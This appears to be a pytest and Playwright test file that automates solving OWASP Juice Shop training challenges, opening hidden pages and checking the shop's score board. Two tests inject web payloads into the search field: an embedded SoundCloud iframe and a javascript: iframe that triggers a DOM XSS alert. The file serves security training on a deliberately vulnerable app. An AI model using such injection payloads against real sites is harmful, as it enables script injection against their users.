import pytest
from playwright.sync_api import Page
from pytest_check import check
from playwright.sync_api import Playwright, APIRequestContext
from typing import Generator

from juice_shop import JuiceShop

@pytest.fixture(scope="function", autouse=True)
def juice_shop(page: Page):
    juice_shop = JuiceShop(page)
    yield juice_shop

@pytest.fixture(scope="session")
def api_request_context(
        playwright: Playwright,
) -> Generator[APIRequestContext, None, None]:
    request_context = playwright.request.new_context(
        base_url = "https://stc-owasp-juice-dnebatcgf2ddf4cr.uksouth-01.azurewebsites.net"
    )
    yield request_context
    request_context.dispose()

@pytest.mark.parametrize("page_name", ["Privacy Policy", "Score Board"])
def test_opening_hidden_pages(juice_shop, page_name, api_request_context):
    juice_shop.open_shop()
    juice_shop.open_page(page_name)
    check.equal(True, juice_shop.check_challenge_solved(page_name, api_request_context))

def test_injecting_payload(juice_shop, api_request_context):
    juice_shop.open_shop()
    juice_shop.search_for('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
    check.equal(True, juice_shop.check_challenge_solved("Bonus Payload", api_request_context))

def test_injecting_xss(juice_shop, api_request_context):
    juice_shop.open_shop()
    juice_shop.search_for('<iframe src="javascript:alert(`xss`)">')
    check.equal(True, juice_shop.check_challenge_solved("DOM XSS", api_request_context))
